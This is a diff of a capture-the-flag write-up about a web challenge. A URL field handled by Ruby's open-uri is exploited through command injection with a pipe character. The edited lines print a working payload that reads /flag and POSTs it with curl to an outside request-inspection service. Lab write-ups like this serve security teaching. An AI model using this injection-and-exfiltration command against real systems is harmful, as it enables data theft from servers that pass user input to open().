@@ -13,9 +13,9 @@ After connecting to the website, you have access to some links, no forms. Nevert
 We run a script to see if there were some hidden pages and found one with the id: `id=18`
 
 It asks us to enter a website.
-If you enter a correct website like http://google.com you have a string showing `validated` whereas is you only put google.com, it show `error`.
+If you enter a correct website like http://google.com you have a string showing `validated` whereas is you only put google.com, it shows `error`.
 
-When you enter a correct website, the server does a GET request on it.
+When you enter a correct website, the server does a GET request on it.²
 
 So we played a bit with this field and found out that `/etc` is a correct website. We then tried with the linux filesystem `/var` and some linux commands `/bin/ls` etc and finally, we tried `/flag`. It worked. Nice, maybe it's where the flag is, but can we access it ?
 
@@ -28,6 +28,6 @@ So we have to find a function in ruby that could open a file or a URL.
 
 We found open-uri and the vulnerabilities related to it: [sakurity.com](https://sakurity.com/blog/2015/02/28/openuri.html)
 
-Let's try a `| ls` : it's validated. We've got a command injection. Let's craft our command so it can read the /flag file and send it to a serveur: `|curl -d "$(cat /flag)" -X POST http://ptsv2.com/t/3awt7-1521988385/post` (we use ptsv2 website to inspect the content of the HTTP requests)
+Let's try a `| ls` : it's validated. We've got a command injection. Let's craft our command so it can read the /flag file and send it to a server: `|curl -d "$(cat /flag)" -X POST http://ptsv2.com/t/3awt7-1521988385/post` (we use ptsv2 website to inspect the content of the HTTP requests)
 
 Bingo ! We've got out flag ! 
